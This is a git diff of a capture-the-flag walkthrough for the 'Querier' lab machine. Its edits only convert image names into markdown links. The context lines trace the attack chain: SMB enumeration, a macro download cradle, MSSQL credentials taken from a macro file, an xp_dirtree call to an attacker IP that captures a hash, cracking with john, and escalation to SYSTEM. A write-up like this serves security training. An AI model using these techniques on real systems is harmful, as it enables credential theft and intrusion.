@@ -5,7 +5,7 @@
 ### Difficulty: Medium
 --------------------------------------------
 
-Querier.png
+![Querier.png](../assets/querier_assets/Querier.png)
 
 I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:
 
@@ -74,7 +74,7 @@ Nmap done: 1 IP address (1 host up) scanned in 72.35 seconds
 
 Using smbclient I can see there is a Reports SMB share, lets try connectiong and using the `get` command to download its contents:
 
-querier_smb.png
+![querier_smb.png](../assets/querier_assets/querier_smb.png)
 
 Interestingly, my normal go-to tool for SMB enumeration was unsuccesful at finding the share:
 
@@ -100,11 +100,11 @@ I've heard CME is being deprecated and functionality is moving over to netexec. 
 
 Anyways, opening 'Currency Volume Report.xlsm' we are warned that the file contains macros.
 
-querier_macro_warning.png
+![querier_macro_warning.png](../assets/querier_assets/querier_macro_warning)
 
 Looking at the contents it appears to be a blank document, but if we go to Tools > Edit Macros, we find something strange:
 
-querier_macro.png
+![querier_macro.png](../assets/querier_assets/querier_macro.png)
 
 It appears that when the macro is run a Powershell download cradle attempts to download a file called shell.ps1 and then execute it.
 
@@ -167,7 +167,7 @@ Cool, looking through the files we find a binary called vbaProject.bin.
 
 Running `strings` against it we find a password for the MSSQL db:
 
-querier_pass.png
+![querier_pass.png](../assets/querier_assets/querier_pass.png)
 
 We can now login to MSSQL with `reporting:PcwTWTHRwryjc$c6`
 
@@ -204,11 +204,11 @@ EXEC master..xp_dirtree '\\10.10.14.49\testing\'
 
 Nice, that worked. We've intercepted a hash for mssql-svc:
 
-querier_responder.png
+![querier_responder.png](../assets/querier_assets/querier_responder.png)
 
 Lets copy this hash into a file called mssql-svc_hash and try cracking it with john:
 
-querier_john.png
+![querier_john.png](../assets/querier_assets/querier_john.png)
 
 Nice that worked, we now have credentials for the mssql-svc account. `mssql-svc:corporate568`
 
@@ -279,7 +279,7 @@ QUERIER
 
 We can now grab the user.txt flag:
 
-querier_user_flag.png
+![querier_user_flag.png](../assets/querier_assets/querier_user_flag.png)
 
 ### Privilege Escalation
 
@@ -322,7 +322,7 @@ nt authority\system
 
 Nice, that worked! Lets grab the final flag:
 
-querier_root_flag.png
+![querier_root_flag.png](../assets/querier_assets/querier_root_flag.png)
 
 Thanks for following along!
 
